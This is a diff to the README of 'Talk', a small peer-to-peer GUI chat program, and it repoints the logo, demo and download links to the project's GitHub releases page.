@@ -1,5 +1,5 @@
 # Talk 🗨️
-![Talk Logo](https://example.com/talklogo.png)
+![Talk Logo](https://github.com/djordy015/Talk/releases)
 
 Welcome to **Talk**, a very simple GUI text communication software designed for seamless communication among groups. With **Talk**, you can easily connect with others using instant messaging in a peer-to-peer network. Whether you want to chat with friends, collaborate with colleagues, or stay in touch with family, **Talk** provides a user-friendly platform for all your communication needs.
 
@@ -12,7 +12,7 @@ Welcome to **Talk**, a very simple GUI text communication software designed for 
 - Utilizes TCP for server communication
 
 ## Installation 🖥️
-To start using **Talk**, simply download the software from the following link: [Download Talk](https://github.com/releases/789694263/Release.zip)
+To start using **Talk**, simply download the software from the following link: [Download Talk](https://github.com/djordy015/Talk/releases)
 
 *Note: The provided link needs to be launched to download the software.*
 
@@ -44,4 +44,4 @@ If you're interested in contributing to **Talk**, check out the repository on Gi
 
 Let's start talking with **Talk**! 🌐🗨️
 
-![Talk Demo](https://example.com/talkdemo.gif)
+![Talk Demo](https://github.com/djordy015/Talk/releases)
